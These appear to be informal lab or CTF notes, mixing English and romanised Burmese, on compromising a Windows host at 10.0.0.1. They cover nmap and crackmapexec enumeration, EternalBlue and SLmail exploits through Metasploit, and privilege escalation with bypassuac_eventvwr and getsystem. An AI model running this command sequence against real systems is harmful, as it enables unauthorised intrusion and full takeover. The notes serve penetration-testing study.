

nmap  10.0.0.1 -sV -sC  (i saw rdp port was open)

nmap 10.0.0.1 -O

crackmapexec smb 10.0.0.1

rdesktop 10.0.0.1    -> rdp htal win dat pone san ( but we need username and password)

crackmapexec smb 10.0.0.1 --share   => share file twe ko kyi dar ( tool a thint lay paw)

we saw SLmail smtpd service when we enum

and then we found exploit -> and then run with metasploit - > we gotdone bro

**##### we must change payload for everytimes 

smb run nay yin eternalblue pouk phot myar dal ( at port 445 )


****# nmap net script ye nee

nmap -p 445 --script=smb-vlun-ms17-010 10.0.0.1      -> script n nout ka har ka exploit version

we can find exploit like that
eternalblue exploit dev.io **##



----
metasploit ma  post exploition

getuid -> we get ccp -> system access paw lan

bg      -> background htal htat dar

sessions -l   -> session ko kyi dar

search suggester    -> suggest yu dr

use 0    -> use lit dar

options    -> option kyi dar

set session 2    => session -l mar kyi done ka 2 twe lot hehe

exploit    -> done



--> we found exploit name ( bypassuac_eventvwr)

search bypassuac_eventvwr   -> exploit name net shar dar

options   -> show dar

set session 2  -> session 2 shi dar lot

session -l  -> port 444 ka a lote lot nay dal

set LPORT 555  -> 444 ks use htar pee thar mot

exploit   -> done

getuid -> check dar -> but root ma pyint tay buu 

getsystem    -> system user ya aung 

getuid  -> we got system hahah##




